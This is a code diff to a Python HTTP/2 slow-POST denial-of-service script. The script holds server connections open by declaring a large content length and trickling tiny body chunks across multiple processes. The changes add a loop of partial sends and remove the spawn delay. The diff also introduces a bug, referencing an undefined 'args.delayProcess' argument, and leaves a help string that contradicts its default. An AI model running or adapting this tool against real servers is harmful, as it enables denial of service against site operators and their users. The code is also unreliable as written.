@@ -55,9 +55,11 @@ def send_slow_post(tls_sock, target, path):
             (':authority', target),
             (':scheme', 'https'),
             (':path', path),
-            ('content-length', '10000'),  # Large content length but no data will be sent
+            ('content-length', '10000'),
+            # ('content-length', str(len('test=MY_UNIQUE_TEST_STRING'))),
             ('content-type', 'application/x-www-form-urlencoded')
         ]
+
 
         # Send HEADERS frame with END_HEADERS set and END_STREAM unset
         stream_id = conn.get_next_available_stream_id()
@@ -65,6 +67,14 @@ def send_slow_post(tls_sock, target, path):
         tls_sock.sendall(conn.data_to_send())
 
         print(f"POST headers sent. Server is waiting for data...")
+
+        for i in range(args.range):
+            # Send part of the body containing the 'test' parameter
+            body = "test=MY_UNIQUE_TEST_STRING"
+            conn.send_data(stream_id, body.encode('utf-8'), end_stream=False)  # Partial data, do not end the stream
+            tls_sock.sendall(conn.data_to_send())
+
+            time.sleep(5)
 
         # Loop to keep the connection open without sending data (simulating a Slow POST)
         while True:
@@ -90,7 +100,7 @@ def main():
     """
     # Establish a secure TLS connection
     tls_sock = establish_tls_connection(args.target, args.port)
-    
+
     # Send the slow POST request
     send_slow_post(tls_sock, args.target, args.path)
 
@@ -101,7 +111,8 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
     parser.add_argument('--path', type=str, default="/", help="Target path (default: '/').")
     parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
-    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")
+    parser.add_argument('-d', '--delay', type=float, default=0, help="Delay between spawning processes in seconds (default: 0.1).")
+    parser.add_argument('-r', '--range', type=int, default=3, help="Range send data (default: 3).")
 
     args = parser.parse_args()
 
@@ -116,7 +127,7 @@ if __name__ == "__main__":
         process.start()
 
         # Delay between starting each process to control the load on the server
-        time.sleep(args.delay)
+        time.sleep(args.delayProcess)
 
     # Join the processes to wait for their completion
     for process in process_list:
